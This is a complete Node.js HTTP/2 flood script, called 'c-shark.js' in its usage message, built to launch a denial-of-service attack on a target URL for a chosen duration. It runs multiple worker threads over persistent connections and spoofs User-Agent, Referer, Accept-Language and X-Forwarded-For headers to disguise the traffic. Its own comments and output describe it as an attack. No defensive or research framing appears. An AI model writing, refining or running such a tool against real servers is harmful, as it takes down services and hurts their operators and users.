const http2 = require('http2');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

// Load User-Agent list from ua.txt
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(line => line.trim()).filter(line => line);
const referrers = [
    'https://google.com', 'https://yahoo.com', 'https://bing.com', 
    'https://duckduckgo.com', 'https://wikipedia.org', 'https://reddit.com'
]; // Add more as needed
const headersList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
]; // Add more as needed

const THREADS = Math.min(6, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node c-shark.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    // Random header spoofing function
    function randomizeHeaders() {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const referrer = referrers[Math.floor(Math.random() * referrers.length)];
        const acceptLang = ['en-US,en;q=0.9', 'es-ES,es;q=0.9', 'fr-FR,fr;q=0.9'][Math.floor(Math.random() * 3)];
        const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

        return {
            ':method': 'GET',
            ':path': '/',
            ':authority': target.replace('https://', '').replace('http://', ''),
            'User-Agent': userAgent,
            'Referer': referrer,
            'Accept-Language': acceptLang,
            'X-Forwarded-For': xForwardedFor,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br'
        };
    }

    // Flood the server
    function startFlood(client) {
        const interval = setInterval(() => {
            if (Date.now() > end) return clearInterval(interval);
            if (client.destroyed || client.closed) return;

            try {
                const headers = randomizeHeaders();
                const req = client.request(headers);
                req.on('error', () => {});
                req.end();
            } catch (err) {
                // Ignore errors from dead sessions
            }
        }, Math.random() * 20); // Add slight random delays to make it look natural
    }

    // Create and flood HTTP/2 connection
    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (err) {
            return setTimeout(createConnection, 100);
        }

        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 100));
        client.on('connect', () => startFlood(client));
    }

    // Initiate multiple persistent connections
    for (let i = 0; i < 10; i++) createConnection();
}
